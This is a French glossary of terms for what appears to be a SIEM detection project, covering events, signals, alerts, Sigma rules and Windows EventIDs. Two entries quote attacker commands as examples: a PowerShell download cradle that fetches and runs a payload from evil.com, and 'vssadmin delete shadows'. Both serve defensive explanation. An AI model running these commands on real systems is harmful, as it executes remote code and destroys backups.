# Glossaire

**Alert**  
Objet de haut niveau produit par le corrélateur. Une Alert agrège un ou plusieurs Signals et porte une sévérité calculée et des actions suggérées. C'est l'artefact consommé par l'analyste SOC.

**CanonicalEvent**  
Représentation normalisée et immuable d'un événement de sécurité. Produit par le normalizer à partir d'un événement brut. `frozen=True` garantit son immuabilité.

**CommandLine**  
Arguments complets passés à un processus à sa création. Champ critique pour la détection LOTL — absent par défaut dans EventID 4688 sans configuration d'audit spécifique.

**Confidence**  
Mesure de la certitude d'un Signal (0.0–1.0). En v1, identique au score. En v2, sera découplé : un événement peut avoir un score élevé (comportement très suspect) mais une confidence faible (données insuffisantes pour confirmer).

**Download Cradle**  
Technique consistant à télécharger et exécuter un payload en mémoire sans l'écrire sur disque. Exemple classique : `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`.

**EventID**  
Identifiant numérique d'un type d'événement Windows. Les EventID clés pour ce SIEM : 1 (Sysmon process), 3 (Sysmon network), 4104 (PowerShell script block), 4624/4625 (logon), 4688 (process creation), 4698/4699 (scheduled task).

**JSONL (JSON Lines)**  
Format de fichier où chaque ligne est un objet JSON indépendant. Idéal pour les logs car chaque événement est auto-contenu et le fichier peut être traité ligne par ligne sans charger l'intégralité en mémoire.

**LOTL (Living off the Land)**  
Technique d'attaque consistant à utiliser des binaires légitimes du système (powershell.exe, certutil.exe, wmic.exe…) pour exécuter du code malveillant, évitant ainsi la détection par signature.

**Normalizer**  
Composant qui convertit un événement brut hétérogène en un `CanonicalEvent` typé et structuré. Première couche de traitement après l'ingestion.

**Process Key**  
Identifiant composite d'un processus : `name|pid|path`. Utilisé pour regrouper les événements d'un même processus. Limitation : les PID sont réutilisés par l'OS.

**Signal**  
Résultat d'un module de détection. Porte un score (0.0–1.0), une liste de facteurs de risque, et des pointeurs vers les événements sources. Niveau intermédiaire entre événement brut et alerte.

**Sigma**  
Format standard ouvert pour les règles de détection SIEM, indépendant de la plateforme (Splunk, Elastic, QRadar…). Ce SIEM implémente un sous-ensemble minimal du format Sigma YAML.

**stable_event_id**  
Hash SHA-256 déterministe calculé sur le contenu brut d'un événement. Garantit que le même événement produit toujours le même identifiant, rendant le pipeline rejouable.

**VSS (Volume Shadow Copy Service)**  
Service Windows créant des instantanés (shadow copies) du système de fichiers. La suppression des shadow copies (`vssadmin delete shadows`) est un indicateur quasi-pathognomonique du ransomware en phase pré-chiffrement.
